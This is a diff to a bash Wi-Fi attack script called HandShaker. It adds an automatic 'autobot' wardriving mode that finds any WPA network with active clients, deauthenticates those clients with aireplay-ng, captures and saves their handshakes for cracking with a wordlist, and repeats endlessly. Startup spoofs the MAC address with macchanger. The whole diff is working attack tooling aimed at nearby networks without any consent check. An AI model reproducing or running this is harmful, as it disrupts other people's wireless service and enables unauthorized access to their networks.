@@ -13,6 +13,80 @@
 ## GNU General Public License at (http://www.gnu.org/licenses/) for
 ## more details.
 
+fautobot()																#Automagically find active clients and collects new handshakes
+{	
+	clear
+	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -f 750 -a -w $HOME/tmp -o csv --encrypt WPA&
+	DONE=""
+	$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
+	echo
+	$COLOR 4;echo " [*] Scanning for active clients.. ";$COLOR 9
+	while [ $DONE -z ] 2> /dev/null
+		do
+			sleep 5
+			BSSID=$(cat $HOME/tmp-01.csv | grep 'Station' -A 10 | grep ':' | cut -d ',' -f 6 | head -n 1)
+			BSSID=${BSSID:1}
+			ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 14 | head -n 1)
+			ESSID=${ESSID:1}
+			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 4 | head -n 1)
+			CHAN=$((CHAN + 1 - 1))
+			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 10 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
+			if [ ${BSSID:2:1} = ":" ] 2> /dev/null
+				then
+					if [ $(cat $HOME/Desktop/cap/handshakes/got | grep "$BSSID") -z ] 2> /dev/null
+						then
+							DONE=1
+						else
+							DONE=""
+					fi
+			fi
+		done
+	killall airodump-ng
+	rm -rf $HOME/tmp*
+	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
+	DONE=""
+	DECNT=0
+	while [ $DONE -z ] 2> /dev/null
+		do
+			clear
+			$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
+			echo
+			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE ";$COLOR 9;$COLOR2 9
+			echo
+			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
+			echo
+			sleep 3
+			$COLOR 4;echo " [*] Analyzing pcap for handshake [*] ";$COLOR 9
+			sleep 3
+			DONE=$(pyrit -r $HOME/tmp1-01.cap analyze | grep good)
+			sleep 0.5
+			DECNT=$((DECNT + 1))
+			if [ $DECNT -gt 5 ] 2> /dev/null
+				then
+					killall airodump-ng
+					fautobot
+			fi
+		done
+	$COLOR 2;echo " [*] Handshake capture successful! "; $COLOR 9
+	killall airodump-ng
+	clear
+	echo "$BSSID" >> $HOME/Desktop/cap/handshakes/got
+	sort -u $HOME/Desktop/cap/handshakes/got > tmp
+	mv tmp $HOME/Desktop/cap/handshakes/got
+	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*] ";$COLOR 9
+	DATE=$( date +%Y_%m_%d_%H%M%S )
+	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
+	rm -rf $HOME/tmp*
+	clear
+	$COLOR 2;$COLOR2 1;echo " [*] Handshake capture was successful!, Horray for AUTOBOT! ";$COLOR 9;$COLOR2 9
+	echo
+	$COLOR 4;echo $DONE;$COLOR 9
+	echo
+	$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap "";$COLOR 9
+	$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT WILL RESUME IN 3 SECONDS [<] ";$COLOR 9;$COLOR2 9
+	sleep 3
+	fautobot
+}		
 
 fapscan()																#Determine target AP BSSID and channel
 {
@@ -23,7 +97,7 @@ fapscan()																#Determine target AP BSSID and channel
 		do
 			sleep 0.3
 			DONE=$(cat $HOME/tmp-01.csv 2> /dev/null | grep $PARTIALESSID)
-			ESSID=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 14 | head -1)
+			ESSID=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 14 | head -n 1)
 			if [ $ESSID -z ] 2> /dev/null
 				then
 					DONE=""
@@ -32,9 +106,9 @@ fapscan()																#Determine target AP BSSID and channel
 	sleep 0.5
 	killall airodump-ng
 	ESSID=${ESSID:1}
-	CHAN=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 4 | head -1)
+	CHAN=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 4 | head -n 1)
 	CHAN=$((CHAN + 1 - 1))
-	cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 1 | head -1 > $HOME/tmp4.csv
+	cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 1 | head -n 1 > $HOME/tmp4.csv
 	BSSID=$(cat $HOME/tmp4.csv)
 	fclientscan
 }
@@ -135,7 +209,7 @@ fcap()																	#Deauth, capture and strip handshakes
 	CHKEX="0"
 	if [ $CNT = 1 ] 2> /dev/null
 		then
-			CLIE=$(head -1 $HOME/tmp1)
+			CLIE=$(head -n 1 $HOME/tmp1)
 		else
 			$COLOR 2;echo " [*] $CNT active clients found: ";$COLOR 9
 			cat $HOME/tmp1
@@ -145,7 +219,7 @@ fcap()																	#Deauth, capture and strip handshakes
 	fi
 	if [ $CLIE -z ] 2> /dev/null
 		then
-			CLIE=$(head -1 $HOME/tmp1)
+			CLIE=$(head -n 1 $HOME/tmp1)
 	fi
 	DONE=""
 	while [ $DONE -z ] 2> /dev/null
@@ -165,6 +239,9 @@ fcap()																	#Deauth, capture and strip handshakes
 	$COLOR 2;echo " [*] Handshake capture successful! "; $COLOR 9
 	killall airodump-ng
 	clear
+	echo "$BSSID" >> $HOME/Desktop/cap/handshakes/got
+	sort -u $HOME/Desktop/cap/handshakes/got > tmp
+	mv tmp $HOME/Desktop/cap/handshakes/got
 	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*] ";$COLOR 9
 	DATE=$( date +%Y_%m_%d_%H%M%S )
 	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
@@ -234,11 +311,13 @@ fhelp()																	#Help
 	echo """ HandShaker - Detect, capture and crack WPA/2 handshakes by partial unique ESSID
 	Usage: handshaker x y z
 	
-			x - Partial unique ESSID (required)
+			x - Partial unique ESSID
 			y - Wireless Interface card
 			z - path to wordlist to use for cracking
 				
-	eg. handshaker Hub3-F wlan0 /usr/share/wordlists/rockyou.txt"""
+	eg. handshaker Hub3-F wlan0 /usr/share/wordlists/rockyou.txt
+	Typing handshaker -a or --autobot gets you autobot or wardriving mode
+"""
 	exit
 }
 
@@ -270,6 +349,12 @@ fstart()																#Startup
 	ifconfig mon0 down
 	macchanger -a mon0
 	ifconfig mon0 up
+	
+	if [ $AUTO = "Y" ] 2> /dev/null
+		then
+			fautobot
+	fi
+	
 	if [ $DO = "L" ] 2> /dev/null
 	then
 		flistap
@@ -283,6 +368,10 @@ if [ $# -lt 1 ] 2> /dev/null
 	then
 		DO="L"
 fi
+case $1 in
+	"-a")AUTO="Y";;
+	"--autobot")AUTO="Y"
+esac
 PARTIALESSID="$1"
 if [ $3 -z ] 2> /dev/null
 	then
@@ -299,10 +388,10 @@ if [ ! -z $2 ] 2> /dev/null
 		fi
 fi
 
-if [ $1 = "--help" ]
+if [ $1 = "--help" ] 2> /dev/null
 	then
 		fhelp
-elif [ $1 = "-h" ]
+elif [ $1 = "-h" ] 2> /dev/null
 	then
 		fhelp
 fi
